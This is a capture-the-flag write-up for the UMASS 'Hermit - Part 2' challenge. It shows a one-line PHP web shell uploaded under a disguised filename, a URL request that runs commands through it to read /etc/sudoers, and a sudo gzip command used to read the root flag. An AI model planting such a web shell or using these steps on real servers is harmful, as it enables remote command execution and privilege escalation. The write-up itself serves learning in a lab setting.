# Hermit - Part 2

Basically I created a basic reverse shell (```<?php echo shell_exec($_GET['var']);?>```) and uploaded it to the "hermit - part 1" challenge changing the "filename" to:

![image](https://user-images.githubusercontent.com/29373869/112762082-e532c000-8ff5-11eb-989d-aef8fc453599.png)

Now If I wanted to see what's on that directory I only needed to use ```http://url/show.php?filename=F7Smvx&var=cat /etc/sudoers```
After looking around, I tried to do some privilege escalation and found this in /etc/sudoers:

![image](https://user-images.githubusercontent.com/29373869/112762269-af420b80-8ff6-11eb-84cf-1f3a492ec9ab.png)

So I used the command ```sudo /bin/gzip -f /root/rootflag.txt -t``` and...

![image](https://user-images.githubusercontent.com/29373869/112762421-853d1900-8ff7-11eb-99a6-555721f9c2f1.png)


FLAG = UMASS{a_test_of_integrity}
